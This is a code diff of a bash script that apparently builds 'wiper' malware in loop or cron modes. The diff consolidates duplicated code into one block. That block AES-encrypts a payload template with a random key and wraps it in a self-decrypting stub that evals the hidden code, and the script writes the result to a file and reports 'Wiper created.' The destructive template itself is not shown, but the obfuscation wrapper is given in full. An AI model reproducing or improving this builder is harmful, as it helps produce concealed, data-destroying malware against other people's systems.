@@ -154,28 +154,20 @@ key=$(openssl rand -hex 32);iv=$(openssl rand -hex 16);
 if [[ "$type" = "loop" ]]; then
     c="$template\n\n$loop_template"; 
     c=${c//-r SLEEP_TIME=/-r SLEEP_TIME=\"$sleepseconds\";};     
-    encrypted=$(echo -e -n "$c" | openssl enc -aes-256-cbc -K "$key" -iv "$iv" -e -a);
-    encrypted=$(cat << TPL
-#!/usr/bin/env bash
-decrypted=\$(printf "%s" "$encrypted" | openssl enc -aes-256-cbc -K "$key" -iv "$iv" -d -a);
-eval "\$decrypted";
-TPL
-);
-    echo -e "$encrypted" > "$output_file";       
-    echo -e "\n\nLoop wiper created."
-    exit
 
 elif [[ "$type" = "cron" ]]; then 
     template=${template//declare -r SLEEP_TIME=/};        
     c="$template\n\nact\n";             
-    encrypted=$(echo -e -n "$c" | openssl enc -aes-256-cbc -K "$key" -iv "$iv" -e -a);
-    encrypted=$(cat << TPL
+fi
+
+
+encrypted=$(echo -e -n "$c" | openssl enc -aes-256-cbc -K "$key" -iv "$iv" -e -a);
+encrypted=$(cat << TPL
 #!/usr/bin/env bash
 decrypted=\$(printf "%s" "$encrypted" | openssl enc -aes-256-cbc -K "$key" -iv "$iv" -d -a);
 eval "\$decrypted";
 TPL
 );
-    echo -e "$encrypted" > "$output_file";     
-    echo -e "\n\nCron wiper created.";
-    exit;
-fi
+echo -e "$encrypted" > "$output_file";       
+echo -e "\n\nWiper created."
+exit
